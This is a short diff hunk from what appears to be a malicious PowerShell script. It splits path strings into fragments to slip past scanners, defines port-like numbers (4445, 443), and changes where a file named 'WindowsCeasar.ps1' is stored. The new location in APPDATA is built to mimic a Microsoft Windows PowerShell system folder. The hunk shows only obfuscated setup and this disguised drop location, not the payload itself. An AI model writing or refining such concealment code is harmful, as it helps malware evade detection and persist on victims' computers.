@@ -355,8 +355,8 @@ $pUl = [int]('4'+'4'+'4'+'5')
 $pMn = [int]('4'+'4'+'3')
 $hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
 $vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
-$esP1 = '\Docu'; $esP2 = 'ments\Win'; $esP3 = 'dowsCea'; $esP4 = 'sar.ps1'
-$vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
+$esP1 = '\Micro'; $esP2 = 'soft\Win'; $esP3 = 'dows\Power'; $esP4 = 'Shell\ope'; $esP5 = 'rations\S'; $esP6 = 'ystem\Win'; $esP7 = 'dowsCeasar.ps1'
+$vEs = $env:APPDATA + $esP1 + $esP2 + $esP3 + $esP4 + $esP5 + $esP6 + $esP7
 $vCk = 't' + 'e' + 's' + 't'
 
 function FnGk1 {
